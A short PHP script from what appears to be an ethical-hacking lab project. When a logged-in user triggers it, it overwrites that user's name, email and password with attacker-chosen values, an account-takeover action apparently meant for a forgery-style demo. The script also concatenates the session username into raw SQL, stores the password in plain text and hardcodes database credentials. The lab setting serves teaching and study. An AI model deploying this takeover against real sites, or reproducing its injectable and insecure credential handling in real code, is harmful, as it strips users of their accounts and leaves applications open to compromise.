
<?php

session_start();
$con = mysqli_connect("localhost:3306", "admin", "adpassword");
$db= mysqli_select_db($con,"EH_Project");

if($con == false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}

$sql = "update users set Name = 'Attacker', email_address='attacker@gmail.com', password ='Attacker123' where Name = '".$_SESSION['Username']."'";
$run = mysqli_query($con, $sql);

if(! $run ) {
      die('Could not update data: ' . mysqli_error());
   }
   echo "Updated data successfully\n";
   mysqli_close($con);
?>